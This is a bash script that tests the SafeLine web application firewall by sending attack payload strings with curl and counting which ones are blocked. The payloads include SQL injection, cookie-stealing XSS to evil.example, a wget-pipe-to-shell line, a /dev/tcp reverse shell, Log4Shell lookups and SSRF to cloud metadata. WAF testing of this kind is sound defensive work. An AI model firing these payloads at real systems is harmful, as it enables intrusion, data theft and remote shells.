#!/usr/bin/env bash
#
# attack-tests.sh - fire harmless-but-noisy attack payloads at a site protected
# by SafeLine WAF and report which ones were blocked.
#
# The payloads are only *strings* sent to the demo site (which never executes
# them). They are meant to trigger WAF rules, not to compromise anything.
#
# Usage:
#   ./attack-tests.sh https://demo.example.com
#   ./attack-tests.sh demo.example.com -k -d 0.5
#   ./attack-tests.sh https://demo.example.com --flood 200
#
# Only run this against sites you own / are allowed to test.

TARGET=""
INSECURE=0
DELAY="0.3"
TIMEOUT=10
FLOOD=0
# HTTP status codes treated as "the WAF stopped this request".
# SafeLine's default block page is 403; 000 means the connection was dropped.
BLOCK_CODES="${BLOCK_CODES:-403 429 444 000}"

usage() {
  cat <<EOF
Usage: $0 <url-or-domain> [options]

Options:
  -k, --insecure       Skip TLS certificate verification (self-signed certs)
  -d, --delay SECONDS  Pause between requests (default: $DELAY)
  -t, --timeout SEC    Per-request timeout (default: $TIMEOUT)
      --flood N        Also send N rapid requests to test rate limiting
  -h, --help           Show this help

Environment:
  BLOCK_CODES          Space-separated status codes counted as "blocked"
                       (default: "$BLOCK_CODES")
EOF
}

while [ $# -gt 0 ]; do
  case "$1" in
    -k|--insecure) INSECURE=1 ;;
    -d|--delay)    DELAY="${2:?missing value for $1}"; shift ;;
    -t|--timeout)  TIMEOUT="${2:?missing value for $1}"; shift ;;
    --flood)       FLOOD="${2:?missing value for $1}"; shift ;;
    -h|--help)     usage; exit 0 ;;
    -*)            echo "Unknown option: $1" >&2; usage >&2; exit 2 ;;
    *)             TARGET="$1" ;;
  esac
  shift
done

if [ -z "$TARGET" ]; then usage >&2; exit 2; fi
case "$TARGET" in
  http://*|https://*) ;;
  *) TARGET="https://$TARGET" ;;
esac
BASE="${TARGET%/}"

command -v curl >/dev/null 2>&1 || { echo "curl is required" >&2; exit 1; }

CURL_OPTS=(-s -o /dev/null --max-time "$TIMEOUT" -w '%{http_code}')
[ "$INSECURE" -eq 1 ] && CURL_OPTS+=(-k)

if [ -t 1 ]; then
  RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
  BOLD=$'\033[1m'; DIM=$'\033[2m'; RESET=$'\033[0m'
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; BOLD=""; DIM=""; RESET=""
fi

TOTAL_ATTACKS=0
BLOCKED=0
MISSED=0
BASELINE_FAIL=0
MISSED_LIST=()

is_block_code() {
  local c
  for c in $BLOCK_CODES; do [ "$1" = "$c" ] && return 0; done
  return 1
}

section() {
  printf '\n%s== %s ==%s\n' "$BOLD$BLUE" "$1" "$RESET"
}

# t <expect: allow|block> <description> <curl args...>
t() {
  local expect="$1" desc="$2"; shift 2
  local code
  code=$(curl "${CURL_OPTS[@]}" "$@" 2>/dev/null)
  [ -z "$code" ] && code="000"

  local verdict
  if is_block_code "$code"; then verdict="blocked"; else verdict="allowed"; fi

  if [ "$expect" = "allow" ]; then
    if [ "$verdict" = "allowed" ]; then
      printf '  %s[ OK      ]%s %-58s %s%s%s\n' "$GREEN" "$RESET" "$desc" "$DIM" "$code" "$RESET"
    else
      printf '  %s[ WRONG   ]%s %-58s %s%s (legit request was blocked!)%s\n' "$RED" "$RESET" "$desc" "$DIM" "$code" "$RESET"
      BASELINE_FAIL=$((BASELINE_FAIL + 1))
    fi
  else
    TOTAL_ATTACKS=$((TOTAL_ATTACKS + 1))
    if [ "$verdict" = "blocked" ]; then
      printf '  %s[ BLOCKED ]%s %-58s %s%s%s\n' "$GREEN" "$RESET" "$desc" "$DIM" "$code" "$RESET"
      BLOCKED=$((BLOCKED + 1))
    else
      printf '  %s[ MISSED  ]%s %-58s %s%s%s\n' "$YELLOW" "$RESET" "$desc" "$DIM" "$code" "$RESET"
      MISSED=$((MISSED + 1))
      MISSED_LIST+=("$desc")
    fi
  fi
  sleep "$DELAY"
}

echo "${BOLD}SafeLine attack test${RESET}"
echo "Target : $BASE"
echo "Blocked status codes: $BLOCK_CODES"

# -----------------------------------------------------------------------------
section "0. Baseline (normal traffic, must NOT be blocked)"
t allow "GET /"                          "$BASE/"
t allow "GET /search?q=hello"            -G --data-urlencode 'q=hello world' "$BASE/search"
t allow "GET /api/users?id=1"            "$BASE/api/users?id=1"
t allow "POST /login (wrong password)"   --data-urlencode 'username=alice' --data-urlencode 'password=hunter2' "$BASE/login"
t allow "POST /guestbook (plain message)" --data-urlencode 'name=Tester' --data-urlencode 'message=Hello from the test script' "$BASE/guestbook"

if [ "$BASELINE_FAIL" -ge 3 ]; then
  echo
  echo "${RED}Most baseline requests failed. Check the URL, DNS, TLS (try -k) or that the site is up.${RESET}"
  exit 1
fi

# -----------------------------------------------------------------------------
section "1. SQL injection"
t block "Classic tautology in query string"         -G --data-urlencode "q=' OR '1'='1" "$BASE/search"
t block "UNION SELECT"                              -G --data-urlencode 'id=1 UNION SELECT username,password FROM users--' "$BASE/api/users"
t block "Stacked query DROP TABLE"                  -G --data-urlencode "id=1; DROP TABLE users;--" "$BASE/api/users"
t block "Auth bypass in login form"                 --data-urlencode "username=admin'--" --data-urlencode 'password=x' "$BASE/login"
t block "Time-based blind (SLEEP)"                  -G --data-urlencode "id=1 AND SLEEP(5)" "$BASE/api/users"
t block "Error-based (@@version)"                   -G --data-urlencode "id=1' AND 1=CONVERT(int,(SELECT @@version))--" "$BASE/api/users"
t block "SQLi inside JSON body"                     -H 'Content-Type: application/json' --data '{"id":"1 OR 1=1; SELECT * FROM information_schema.tables--"}' "$BASE/api/echo"

# -----------------------------------------------------------------------------
section "2. Cross-site scripting (XSS)"
t block "<script> tag in query"                     -G --data-urlencode 'q=<script>alert(document.cookie)</script>' "$BASE/search"
t block "<img onerror> handler"                     -G --data-urlencode 'q=<img src=x onerror=alert(1)>' "$BASE/search"
t block "<svg onload> handler"                      -G --data-urlencode 'q=<svg/onload=alert(1)>' "$BASE/search"
t block "javascript: URI"                           -G --data-urlencode 'q=<a href="javascript:alert(1)">x</a>' "$BASE/search"
t block "Stored XSS via guestbook"                  --data-urlencode 'name=<b>x</b>' --data-urlencode 'message=<script>fetch("//evil.example/?c="+document.cookie)</script>' "$BASE/guestbook"
t block "Encoded XSS (%3Cscript%3E)"                "$BASE/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

# -----------------------------------------------------------------------------
section "3. Path traversal / local file inclusion"
t block "../../etc/passwd"                          -G --data-urlencode 'name=../../../../etc/passwd' "$BASE/files"
t block "Encoded ..%2f..%2f"                        "$BASE/files?name=..%2f..%2f..%2fetc%2fpasswd"
t block "Double-encoded %252e%252e"                 "$BASE/files?name=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
t block "Raw traversal in URL path"                 --path-as-is "$BASE/../../../../etc/passwd"
t block "Windows win.ini"                           -G --data-urlencode 'name=..\..\..\windows\win.ini' "$BASE/files"
t block "php://filter wrapper"                      -G --data-urlencode 'name=php://filter/convert.base64-encode/resource=index.php' "$BASE/files"
t block "file:// wrapper"                           -G --data-urlencode 'name=file:///etc/passwd' "$BASE/files"

# -----------------------------------------------------------------------------
section "4. Command injection / code execution"
t block "; cat /etc/passwd"                         -G --data-urlencode 'q=test; cat /etc/passwd' "$BASE/search"
t block "\$(whoami) substitution"                   -G --data-urlencode 'q=$(whoami)' "$BASE/search"
t block "Backtick \`id\`"                           -G --data-urlencode 'q=`id`' "$BASE/search"
t block "|| wget reverse shell"                     -G --data-urlencode 'q=x || wget http://evil.example/shell.sh -O- | sh' "$BASE/search"
t block "Reverse shell one-liner"                   -G --data-urlencode 'q=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' "$BASE/search"
t block "PHP code injection"                        -G --data-urlencode "q=<?php system(\$_GET['c']); ?>" "$BASE/search"
t block "Server-side template injection {{7*7}}"    -G --data-urlencode 'q={{7*7}}{{config.__class__.__init__.__globals__}}' "$BASE/search"
t block "Node.js child_process payload"             -G --data-urlencode "q=require('child_process').exec('id')" "$BASE/search"

# -----------------------------------------------------------------------------
section "5. Known CVE-style payloads"
t block "Log4Shell in query"                        -G --data-urlencode 'q=${jndi:ldap://evil.example/a}' "$BASE/search"
t block "Log4Shell in User-Agent"                   -H 'User-Agent: ${jndi:ldap://evil.example/a}' "$BASE/"
t block "Log4Shell in X-Api-Version header"         -H 'X-Api-Version: ${jndi:dns://evil.example/x}' "$BASE/"
t block "Shellshock in User-Agent"                  -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' "$BASE/"
t block "Struts OGNL in Content-Type"               -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}" --data 'x=1' "$BASE/api/echo"
t block "Spring4Shell-style class.module params"    "$BASE/search?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x"

# -----------------------------------------------------------------------------
section "6. SSRF and XXE"
t block "SSRF to cloud metadata (169.254.169.254)"  -G --data-urlencode 'q=http://169.254.169.254/latest/meta-data/iam/security-credentials/' "$BASE/search"
t block "SSRF to localhost admin"                   -G --data-urlencode 'name=http://127.0.0.1:8080/admin' "$BASE/files"
t block "XXE external entity"                       -H 'Content-Type: application/xml' --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$BASE/api/echo"

# -----------------------------------------------------------------------------
section "7. Scanner / bot fingerprints"
t block "User-Agent: sqlmap"                        -A 'sqlmap/1.7.2#stable (https://sqlmap.org)' "$BASE/"
t block "User-Agent: Nikto"                         -A 'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:001)' "$BASE/"
t block "User-Agent: Nmap Scripting Engine"         -A 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)' "$BASE/"
t block "User-Agent: Acunetix"                      -A 'Acunetix-Product: WVS/15.0 (Acunetix Web Vulnerability Scanner)' "$BASE/"
t block "User-Agent: masscan"                       -A 'masscan/1.3 (https://github.com/robertdavidgraham/masscan)' "$BASE/"

# -----------------------------------------------------------------------------
section "8. Sensitive file / admin panel probing"
t block "/.env"                                     "$BASE/.env"
t block "/.git/config"                              "$BASE/.git/config"
t block "/wp-login.php"                             "$BASE/wp-login.php"
t block "/phpmyadmin/"                              "$BASE/phpmyadmin/"
t block "/backup.sql"                               "$BASE/backup.sql"
t block "/cgi-bin/ shell probe"                     "$BASE/cgi-bin/test.cgi"
t block "/actuator/env (Spring Boot)"               "$BASE/actuator/env"
t block "/server-status (Apache)"                   "$BASE/server-status"

# -----------------------------------------------------------------------------
section "9. Protocol / method abuse"
t block "HTTP TRACE method"                         -X TRACE "$BASE/"
t block "Null byte in path"                         "$BASE/files?name=readme.txt%00.jpg"
t block "CRLF injection (header splitting)"         "$BASE/search?q=x%0d%0aSet-Cookie:%20admin=true"

# -----------------------------------------------------------------------------
if [ "$FLOOD" -gt 0 ]; then
  section "10. HTTP flood ($FLOOD rapid requests)"
  tmp="$(mktemp)"
  for _ in $(seq 1 "$FLOOD"); do
    ( curl "${CURL_OPTS[@]}" "$BASE/" >> "$tmp" 2>/dev/null; echo >> "$tmp" ) &
    # keep at most 20 requests in flight
    while [ "$(jobs -rp | wc -l)" -ge 20 ]; do sleep 0.05; done
  done
  wait
  flood_blocked=0
  flood_total=0
  while read -r code; do
    [ -z "$code" ] && continue
    flood_total=$((flood_total + 1))
    is_block_code "$code" && flood_blocked=$((flood_blocked + 1))
  done < "$tmp"
  rm -f "$tmp"
  if [ "$flood_blocked" -gt 0 ]; then
    printf '  %s[ BLOCKED ]%s rate limiting kicked in: %s/%s requests were stopped\n' "$GREEN" "$RESET" "$flood_blocked" "$flood_total"
  else
    printf '  %s[ MISSED  ]%s none of %s requests were limited (enable a Rate Limiting rule in SafeLine)\n' "$YELLOW" "$RESET" "$flood_total"
  fi
  sleep 2
fi

# -----------------------------------------------------------------------------
section "Post-test check"
echo "${DIM}If this is blocked, SafeLine has probably auto-banned your IP after the attacks above.${RESET}"
t allow "GET / after the attacks"                   "$BASE/"

# -----------------------------------------------------------------------------
echo
echo "${BOLD}Summary${RESET}"
echo "  Attack requests sent : $TOTAL_ATTACKS"
echo "  ${GREEN}Blocked${RESET}              : $BLOCKED"
echo "  ${YELLOW}Not blocked${RESET}          : $MISSED"
if [ "$TOTAL_ATTACKS" -gt 0 ]; then
  echo "  Detection rate       : $((BLOCKED * 100 / TOTAL_ATTACKS))%"
fi
if [ "$MISSED" -gt 0 ]; then
  echo
  echo "Not blocked (check SafeLine protection mode, rule levels and custom rules):"
  for m in "${MISSED_LIST[@]}"; do echo "  - $m"; done
fi
echo
echo "Now open SafeLine -> Attack Events to see what was recorded."
